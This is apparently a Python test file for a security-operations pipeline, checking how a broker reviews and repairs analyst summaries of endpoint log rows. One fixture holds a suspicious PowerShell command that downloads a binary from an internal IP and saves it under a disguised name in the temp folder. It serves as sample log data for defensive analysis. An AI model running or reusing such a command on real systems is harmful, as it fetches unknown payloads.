"""B14: the Broker reviews each sub-analyst translation against what code computed from
the rows, re-asks it once, and records a limitation the Analyst can read."""

from __future__ import annotations

from dataclasses import dataclass
from datetime import UTC, datetime

from contracts import AnalystTask, DomainFinding, Entity, ResultSet, Scope

from smartops import broker as broker_module
from smartops.broker import BrokerRequest, Translator, _Translation, _translations_open
from smartops.subagent_analysts import analyze
from smartops.subagent_analysts.routing import DomainSlice

DOWNLOAD = (
    "powershell.exe -NoProfile -Command \"Invoke-WebRequest -Uri http://192.168.77.211:8888/update/"
    "win-agent-2.4.1.bin -UseBasicParsing -OutFile $env:TEMP\\svcupdate.dat\""
)
VAGUE = "HOST-1 ran powershell.exe, which downloads an update [processes#1]"
CLEAR = ("HOST-1 ran powershell.exe, which downloads win-agent-2.4.1.bin from 192.168.77.211 "
         "to $env:TEMP\\svcupdate.dat [processes#1]")


@dataclass
class _Ctx:
    tool_use: dict
    invocation_state: dict


def _scope() -> Scope:
    return Scope(entities=[Entity(kind="host", value="HOST-1")],
                 time_window=(datetime(2026, 10, 1, tzinfo=UTC), datetime(2026, 10, 2, tzinfo=UTC)))


def _request(observations: list[str]) -> BrokerRequest:
    rows = [{"host": "HOST-1", "process_name": "powershell.exe", "CommandLine": DOWNLOAD}]
    slice_ = DomainSlice(domain="endpoint", siem_sets=[("processes", ResultSet(query="q", row_count=1, rows=rows))])
    task = AnalystTask(task_id="T1", hypothesis_id="T1", goal="what ran", scope=_scope())
    req = BrokerRequest(task=task, translator=Translator(model=None))
    req.translations = {"endpoint": _Translation(DomainFinding(domain="endpoint", observations=observations), slice_)}
    return req


async def _review(req, decision, reason="r"):
    return await broker_module.review_translation(
        domain="endpoint", decision=decision, reason=reason,
        tool_context=_Ctx(tool_use={"toolUseId": "t"}, invocation_state={"smartops": req}))


def test_the_card_shows_a_vague_download_as_not_named():
    req = _request([VAGUE])
    card = broker_module._translation_card("endpoint", req.translations["endpoint"], _scope())
    assert "[download] not named:" in card and "svcupdate.dat" in card and "<translation_card>" in card


async def test_a_vague_download_cannot_be_accepted_and_a_repair_fixes_it(monkeypatch):
    req = _request([VAGUE])
    out = await _review(req, "accepted")
    assert out.startswith("status=refused") and "svcupdate.dat" in out

    seen = {}

    async def fake_retranslate(finding, slice_, scope, model, verifier, reason):
        seen["reason"] = reason
        return DomainFinding(domain="endpoint", observations=[CLEAR])

    monkeypatch.setattr(analyze, "retranslate", fake_retranslate)
    card = await _review(req, "re-asked", "name the downloaded file and where it is written")
    assert seen["reason"].startswith("name the downloaded file") and "[download] named" in card
    assert (await _review(req, "accepted")).startswith("status=recorded")
    assert _translations_open(req) == []


async def test_one_repair_then_a_limitation_the_analyst_can_read(monkeypatch):
    req = _request([VAGUE])

    async def same(finding, *a):
        return finding

    monkeypatch.setattr(analyze, "retranslate", same)
    await _review(req, "re-asked")
    assert (await _review(req, "re-asked")).startswith("status=refused | endpoint has no repair left")
    await _review(req, "limitation", "the rows cut the command off")
    assert req.translations["endpoint"].finding.observations[-1] == analyze.UNTRANSLATED.format(domain="endpoint")


def test_the_finish_check_names_untranslated_and_unreviewed_domains():
    req = _request([VAGUE])
    assert _translations_open(req) == ["endpoint awaiting review_translation"]
    req.translations = None
    assert _translations_open(req) == ["translate_findings has not run"]
    req.translator = None
    assert _translations_open(req) == []


async def test_a_domain_with_rows_and_no_observations_says_so():
    # 3e7613cf: all 8 tasks reached the Analyst with no explanation at all.
    req = _request([])
    slice_ = req.translations["endpoint"].slice_
    assert analyze._said(DomainFinding(domain="endpoint"), slice_).observations == [
        analyze.UNTRANSLATED.format(domain="endpoint")]
    assert analyze._said(DomainFinding(domain="identity"), DomainSlice(domain="identity")).observations == []


async def test_translate_findings_runs_the_sub_analysts_once(monkeypatch):
    req = _request([])
    req.translations = None
    calls = []

    async def fake_translate(report, scope, model, verifier):
        calls.append(report.task_id)
        return [DomainFinding(domain=d) for d in ("identity", "network", "endpoint")]

    monkeypatch.setattr(analyze, "translate", fake_translate)
    ctx = _Ctx(tool_use={"toolUseId": "t"}, invocation_state={"smartops": req})
    out = await broker_module.translate_findings(tool_context=ctx)
    again = await broker_module.translate_findings(tool_context=ctx)
    assert calls == ["T1"] and "nothing to review" in out and again == out
    assert list(req.translations) == ["identity", "network", "endpoint"]
